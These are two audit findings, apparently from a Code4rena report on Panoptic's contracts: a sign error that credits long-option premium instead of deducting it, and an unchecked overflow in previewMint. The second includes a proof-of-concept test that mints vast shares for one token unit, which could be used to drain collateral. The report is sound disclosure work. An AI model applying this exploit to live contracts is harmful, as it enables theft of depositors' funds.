[H-01]SettleLongPremiumis incorrectly implemented: premium should be deducted instead of added
Submitted bypkqs90, also found bybin2chen,Aymen0909,0xStalin,JecikPo, andDanielArmstrong
https://github.com/code-423n4/2024-04-panoptic/blob/main/contracts/PanopticPool.sol#L1621-L1640https://github.com/code-423n4/2024-04-panoptic/blob/main/contracts/CollateralTracker.sol#L1043-L1089
SettleLongPremiumis the function intended to settle premiums for long option holders. When called, it should deduct the premium from the option owner’s account, but the current implementation adds the premium instead.
Bug Description
Let’s see the code for premium calculation. We can see thataccumulatedPremiumands_options[owner][tokenId][legIndex]are premium accumulators for calculating the owed amount of premium, and thataccumulatedPremiumis a LeftRightUnsigned type, which means it must be positive.
TherealizedPremiais also positive, because it is calculated byaccumulatedPremium * liquidity.
The issue occurs when callings_collateralToken.exercise(). TherealizedPremiathat is passed inside should be negative instead of positive, because negative means user pays premia, and positive means user receives premia. The current implementation is incorrect.
PanopticPool.sol
accumulatedPremium=LeftRightUnsigned.wrap(0).toRightSlot(premiumAccumulator0).toLeftSlot(premiumAccumulator1);// update the premium accumulator for the long position to the latest value// (the entire premia delta will be settled)LeftRightUnsignedpremiumAccumulatorsLast=s_options[owner][tokenId][legIndex];s_options[owner][tokenId][legIndex] =accumulatedPremium;>accumulatedPremium=accumulatedPremium.sub(premiumAccumulatorsLast);}uint256liquidity=PanopticMath.getLiquidityChunk(tokenId,legIndex,s_positionBalance[owner][tokenId].rightSlot()).liquidity();unchecked{// update the realized premia>LeftRightSignedrealizedPremia=LeftRightSigned>               .wrap(0)>               .toRightSlot(int128(int256((accumulatedPremium.rightSlot() *liquidity) /2**64)))>               .toLeftSlot(int128(int256((accumulatedPremium.leftSlot() *liquidity) /2**64)));// deduct the paid premium tokens from the owner's balance and add them to the cumulative settled token deltas_collateralToken0.exercise(owner,0,0,0,realizedPremia.rightSlot());s_collateralToken1.exercise(owner,0,0,0,realizedPremia.leftSlot());
CollateralTracker.sol
functionexercise(addressoptionOwner,int128longAmount,int128shortAmount,int128swappedAmount,int128realizedPremium)externalonlyPanopticPoolreturns(int128) {unchecked{// current available assets belonging to PLPs (updated after settlement) excluding any premium paidint256updatedAssets=int256(uint256(s_poolAssets)) -swappedAmount;// add premium to be paid/collected on position close>int256tokenToPay= -realizedPremium;// if burning ITM and swap occurred, compute tokens to be paid through exercise and add swap feesint256intrinsicValue=swappedAmount- (longAmount-shortAmount);if((intrinsicValue!=0) && ((shortAmount!=0) || (longAmount!=0))) {// intrinsic value is the amount that need to be exchanged due to burning in-the-money// add the intrinsic value to the tokenToPaytokenToPay+=intrinsicValue;}>if(tokenToPay>0) {// if user must pay tokens, burn them from user balance (revert if balance too small)uint256sharesToBurn=Math.mulDivRoundingUp(uint256(tokenToPay),totalSupply,totalAssets());_burn(optionOwner,sharesToBurn);>           }elseif(tokenToPay<0) {// if user must receive tokens, mint themuint256sharesToMint=convertToShares(uint256(-tokenToPay));_mint(optionOwner,sharesToMint);}
Proof of Concept
We can also see from unit testtest_success_settleLongPremium: The tests checks that after callingsettleLongPremium, the assets ofBuyer[0]actually increases instead of decreases, which is obviously incorrect.
assetsBefore0=ct0.convertToAssets(ct0.balanceOf(Buyers[0]));assetsBefore1=ct1.convertToAssets(ct1.balanceOf(Buyers[0]));// collect buyer 1's three relevant chunksfor(uint256i=0;i<3; ++i) {pp.settleLongPremium(collateralIdLists[i],Buyers[0],0);}assertEq(ct0.convertToAssets(ct0.balanceOf(Buyers[0])) -assetsBefore0,33_342,"Incorrect Buyer 1 1st Collect 0");
Recommended Mitigation Steps
Take the negative ofrealizedPremiabefore callings_collateralToken.exercise().
dyedm1 (Panoptic) confirmed via duplicate issue #376
Picodes (judge) commented:
Keeping High severity as funds are at stake.

[H-02] Overflow inCollateralTrackerallows minting shares for free
Submitted by0xLogos
https://github.com/code-423n4/2024-04-panoptic/blob/833312ebd600665b577fbd9c03ffa0daf250ed24/contracts/CollateralTracker.sol#L478
https://github.com/code-423n4/2024-04-panoptic/blob/833312ebd600665b577fbd9c03ffa0daf250ed24/contracts/CollateralTracker.sol#L461-L467
Impact
Malicious actors can mint huge amounts of shares for free and then withdraw all collateral.
Proof of Concept
In themintfunction user-controlledsharesparameter goes right away to thepreviewMintfunction which then calculates required assets in unchecked block. If thesharesvalue is high enough, overflow inshares * DECIMALSwill occur, andassetswill be very low.
function previewMint(uint shares) public view returns (uint assets) {unchecked {assets = Math.mulDivRoundingUp(shares * DECIMALS, totalAssets(), totalSupply * (DECIMALS - COMMISSION_FEE));}}function mint(uint shares, address receiver) external returns (uint assets) {assets = previewMint(shares);if (assets > type(uint104).max) revert Errors.DepositTooLarge();...}
Insert the following snippet to ColalteralTracker.t.sol for coded PoC:
function test_poc1(uint256 x) public {_initWorld(x);_grantTokens(Bob);vm.startPrank(Bob);uint shares = type(uint).max / 10000 + 1;IERC20Partial(token0).approve(address(collateralToken0), type(uint256).max);uint256 returnedAssets0 = collateralToken0.mint(shares, Bob);assertEq(shares, collateralToken0.balanceOf(Bob));assertEq(returnedAssets0, 1);}
Recommended Mitigation Steps
Remove unchecked block.
function maxMint(address) external view returns (uint maxShares) {return (convertToShares(type(uint104).max) * DECIMALS) / (DECIMALS + COMMISSION_FEE);}
Assessed type
Under/Overflow
dyedm1 (Panoptic) confirmed

